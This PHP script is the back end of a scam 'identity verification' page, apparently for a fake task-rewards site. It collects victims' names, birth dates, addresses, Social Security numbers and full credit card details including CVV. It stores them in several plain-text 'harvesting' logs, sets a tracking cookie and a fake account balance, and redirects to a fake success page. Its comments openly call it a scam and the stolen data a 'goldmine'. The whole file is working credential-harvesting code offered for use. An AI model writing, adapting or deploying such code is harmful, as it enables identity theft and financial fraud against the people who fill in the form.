<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Start session
session_start();

// Create logs directory if it doesn't exist
if (!is_dir('admin/logs')) {
    mkdir('admin/logs', 0777, true);
}

// Get all form data
$timestamp = date('Y-m-d H:i:s');
$ip_address = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Personal Information
$first_name = $_POST['first_name'] ?? '';
$last_name = $_POST['last_name'] ?? '';
$dob = $_POST['dob'] ?? '';
$phone = $_POST['phone'] ?? '';

// Address Information
$street = $_POST['street'] ?? '';
$city = $_POST['city'] ?? '';
$state = $_POST['state'] ?? '';
$zip = $_POST['zip'] ?? '';

// SSN (GOLDMINE!)
$ssn = $_POST['ssn'] ?? '';

// Credit Card Information (ANOTHER GOLDMINE!)
$card_name = $_POST['card_name'] ?? '';
$card_number = $_POST['card_number'] ?? '';
$card_expiry = $_POST['card_expiry'] ?? '';
$card_cvv = $_POST['card_cvv'] ?? '';

// Agreements
$terms_agree = isset($_POST['terms_agree']) ? 'Yes' : 'No';
$credit_check = isset($_POST['credit_check']) ? 'Yes' : 'No';
$same_address = isset($_POST['same_address']) ? 'Yes' : 'No';

// ========== LOG ALL DATA ==========

// 1. Comprehensive CSV log
$csv_data = [
    $timestamp,
    $ip_address,
    $first_name,
    $last_name,
    $dob,
    $phone,
    $street,
    $city,
    $state,
    $zip,
    $ssn,
    $card_name,
    $card_number,
    $card_expiry,
    $card_cvv,
    $terms_agree,
    $credit_check,
    $same_address,
    $user_agent
];

$csv_line = '"' . implode('","', array_map('addslashes', $csv_data)) . '"' . PHP_EOL;
file_put_contents('admin/logs/verifications.csv', $csv_line, FILE_APPEND);

// 2. Plain text log (easy to read)
$plain_log = "========== NEW IDENTITY VERIFICATION ==========\n";
$plain_log .= "Timestamp: $timestamp\n";
$plain_log .= "IP Address: $ip_address\n";
$plain_log .= "User Agent: $user_agent\n";
$plain_log .= "--- PERSONAL INFORMATION ---\n";
$plain_log .= "Full Name: $first_name $last_name\n";
$plain_log .= "Date of Birth: $dob\n";
$plain_log .= "Phone: $phone\n";
$plain_log .= "--- ADDRESS ---\n";
$plain_log .= "Street: $street\n";
$plain_log .= "City: $city\n";
$plain_log .= "State: $state\n";
$plain_log .= "ZIP: $zip\n";
$plain_log .= "--- SSN (!!! TREASURE !!!) ---\n";
$plain_log .= "Social Security Number: $ssn\n";
$plain_log .= "--- CREDIT CARD ($$$$$$) ---\n";
$plain_log .= "Card Name: $card_name\n";
$plain_log .= "Card Number: $card_number\n";
$plain_log .= "Expiry: $card_expiry\n";
$plain_log .= "CVV: $card_cvv\n";
$plain_log .= "--- AGREEMENTS ---\n";
$plain_log .= "Terms Agreed: $terms_agree\n";
$plain_log .= "Credit Check: $credit_check\n";
$plain_log .= "Same Address: $same_address\n";
$plain_log .= "==============================================\n\n";

file_put_contents('admin/logs/full_identities.txt', $plain_log, FILE_APPEND);

// 3. Separate sensitive data logs (for easy harvesting)
$ssn_log = "$timestamp | $first_name $last_name | $ssn | $dob | $ip_address" . PHP_EOL;
file_put_contents('admin/logs/ssn_database.txt', $ssn_log, FILE_APPEND);

$credit_card_log = "$timestamp | $first_name $last_name | $card_number | $card_expiry | $card_cvv | $ip_address" . PHP_EOL;
file_put_contents('admin/logs/credit_cards.txt', $credit_card_log, FILE_APPEND);

$full_identity_log = "$timestamp | $first_name $last_name | $dob | $ssn | $street, $city, $state $zip | $phone | $card_number" . PHP_EOL;
file_put_contents('admin/logs/complete_identities.txt', $full_identity_log, FILE_APPEND);

// 4. Database-style log (pipe separated)
$db_log = "$timestamp|$ip_address|$first_name|$last_name|$dob|$phone|$street|$city|$state|$zip|$ssn|$card_name|$card_number|$card_expiry|$card_cvv" . PHP_EOL;
file_put_contents('admin/logs/database.txt', $db_log, FILE_APPEND);

// ========== SESSION & REDIRECT ==========

// Store in session (for multi-page scam flow)
$_SESSION['verified'] = true;
$_SESSION['full_name'] = "$first_name $last_name";
$_SESSION['balance'] = 25.00; // Fake bonus increase

// Set a cookie to track this victim
setcookie('taskrewards_verified', 'true', time() + (86400 * 30), "/");

// ========== FAKE PROCESSING MESSAGES ==========

// Simulate "processing" delay
sleep(2);

// Redirect to "success" page
header('Location: verification_success.html');
exit();

// ========== SECURITY (LOL) ==========
// Note: This is a scam site, but we'll add fake security headers
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
?>
